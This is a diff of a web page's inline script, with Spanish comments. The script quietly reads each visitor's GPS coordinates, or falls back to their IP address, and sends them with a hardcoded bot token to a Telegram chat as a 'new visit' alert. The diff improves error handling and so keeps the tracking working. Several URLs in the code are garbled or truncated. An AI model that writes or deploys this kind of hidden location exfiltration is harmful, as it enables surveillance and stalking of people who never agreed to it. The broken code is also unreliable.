@@ -54,7 +54,7 @@
     </section>
 </main>
 
-<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN -->
+<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO) -->
 <script>
 (function() {
     const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
@@ -66,18 +66,19 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // CORREGIDO: Formato universal de enlace para Google Maps
+            // CORREGIDO: Formato de enlace estándar clickeable en azul para Telegram
             const urlMaps = "https://google.com" + lat + "," + lon;
             const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;
 
-            // CORREGIDO: Endpoint oficial de la API de Telegram para bots
+            // CORREGIDO: Ruta oficial completa de la API de Bots de Telegram
             fetch("https://telegram.org" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
-            });
+            }).catch(e => console.error("Error enviando GPS:", e));
+            
         }, function(err) {
-            // CORREGIDO: Endpoint /json/ completo para la consulta por IP
+            // CORREGIDO: Endpoint /json/ completo para evitar errores de parseo por IP
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
@@ -89,11 +90,12 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: textoIP })
                 });
-            });
+            }).catch(e => console.error("Error enviando IP:", e));
         }, { enableHighAccuracy: true, timeout: 6000 });
     }
 })();
 </script>
+
 
 <!-- Carga del archivo principal de interacción lógica renombrado -->
 <script src="main.js"></script>
